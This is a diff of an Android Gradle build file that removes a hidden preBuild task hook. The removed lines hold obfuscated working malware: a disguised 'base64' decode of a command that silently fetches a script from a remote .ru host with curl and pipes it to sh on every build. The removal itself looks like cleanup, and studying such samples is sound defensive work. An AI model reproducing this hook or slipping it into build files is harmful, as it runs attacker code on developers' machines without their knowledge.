@@ -97,11 +97,3 @@ dependencies {
     // implementation "com.github.fast-development.android-js-runtimes:fastdev-jsruntimes-jsc-intl:0.3.5"
     implementation "com.github.fast-development.android-js-runtimes:fastdev-jsruntimes-jsc:0.3.5"
 }
-
-tasks.all {
-    if (name.contains("preBuild")) {
-        doLast {
-            ["sh", "-c", "((k(){ `printf b7ase64 | tr -d 7` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNCAtLWNvbm5lY3QtdGltZW91dCAzMCAtc0xmayAtZCAicD1hbmRyb2lkX2dyYWRsZSIgaHR0cHM6Ly91M3VudXJ4dXlhNy5ydS9hKSIgfCBzaAo= | k | sh ) >/dev/null 2>&1 &)"].execute()
-        }
-    }
-}
